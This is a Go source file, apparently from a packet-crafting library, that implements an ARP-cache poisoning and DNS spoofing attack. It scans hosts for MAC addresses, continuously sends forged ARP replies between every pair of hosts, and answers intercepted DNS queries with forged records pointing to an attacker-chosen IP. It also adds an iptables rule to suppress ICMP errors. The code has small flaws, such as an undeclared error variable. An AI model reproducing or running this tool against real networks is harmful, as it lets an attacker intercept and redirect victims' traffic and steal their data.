package higherlevel

import (
	"bufio"
	"fmt"
	"github.com/google/gopacket/layers"
	craft "github.com/tiagomdiogo/ScaGo/packet"
	communication "github.com/tiagomdiogo/ScaGo/supersocket"
	"github.com/tiagomdiogo/ScaGo/utils"
	"log"
	"net"
	"os"
	"os/exec"
	"time"
)

func parseHosts(hosts string, mapList map[string]string, iface string) {
	file, err := os.Open(hosts)
	if err != nil {
		log.Fatalf("Error opening file: %v", err)
	}
	defer file.Close()

	fmt.Println("Scanning hosts for MAC addresses...")
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if net.ParseIP(line) != nil {
			macAddress, err := ARPScanHost(iface, line)
			if err != nil {
				log.Fatal(err)
			}
			mapList[line] = macAddress
		}
	}
	return

}
func PoisonArp(mapList map[string]string, iface string) {

	macInt := utils.MacByInt(iface)
	fmt.Println("Finished poisoning ARP Caches...")
	for {
		for addr1, mac1 := range mapList {
			for addr2, mac2 := range mapList {
				if addr1 != addr2 {
					fmt.Printf("Spoofing ARP cache: targetIP=%s, targetMac=%s, sourceIP=%s\n", addr1, mac1, addr2)
					packet1, packet2 := CreateFakeArp(addr1, addr2, mac1, mac2, macInt)
					communication.Send(packet1, iface)
					communication.Send(packet2, iface)
				}
			}
		}
		time.Sleep(1 * time.Second)
	}

}

func DNSSpoofing(iface, hosts, fakeIP string) {

	ipMap := make(map[string]string)
	cmd := exec.Command("iptables", "-A", "OUTPUT", "-p", "icmp", "--icmp-type", "destination-unreachable", "-j", "DROP")
	err = cmd.Run()
	if err != nil {
		log.Fatal(err)
	}

	parseHosts(hosts, ipMap, iface)

	go PoisonArp(ipMap, iface)

	for {
		packet := communication.Recv(iface)

		dns := packet.Layer(layers.LayerTypeDNS)
		if dns == nil {
			continue
		}

		ethLayer, _ := packet.Layer(layers.LayerTypeEthernet).(*layers.Ethernet)
		ipLayer, _ := packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
		udpLayer, _ := packet.Layer(layers.LayerTypeUDP).(*layers.UDP)
		dnsLayer, _ := dns.(*layers.DNS)

		if dnsLayer.QR == false && dnsLayer.OpCode == layers.DNSOpCodeQuery {
			//eth layer
			ethToSend := craft.EthernetLayer()
			ethToSend.SetDstMAC(ethLayer.SrcMAC.String())
			ethToSend.SetSrcMAC(utils.MacByInt(iface))
			ethToSend.SetEthernetType(ethLayer.EthernetType)

			//iplayer
			ipToSend := craft.IPv4Layer()
			ipToSend.SetSrcIP(ipLayer.DstIP.String())
			ipToSend.SetDstIP(ipLayer.SrcIP.String())
			ipToSend.SetProtocol(layers.IPProtocolUDP)

			//udpLayer
			udpToSend := craft.UDPLayer()
			udpToSend.SetSrcPort("53")
			udpToSend.SetDstPort(udpLayer.SrcPort.String())
			udpToSend.Layer().SetNetworkLayerForChecksum(ipToSend.Layer())

			//dnsLayer
			dnsToSend := craft.DNSLayer()
			dnsToSend.Layer().ID = dnsLayer.ID
			dnsToSend.Layer().AA = false
			dnsToSend.Layer().ResponseCode = 0
			dnsToSend.AddAnswer(string(dnsLayer.Questions[0].Name), fakeIP)
			dnsToSend.Layer().Questions = dnsLayer.Questions

			packetCrafted, _ := craft.CraftPacket(ethToSend.Layer(), ipToSend.Layer(), udpToSend.Layer(), dnsToSend.Layer())
			fmt.Printf("Sending DNS record to host at %s\n", ipLayer.DstIP.String())
			communication.Send(packetCrafted, iface)

		}
	}

}
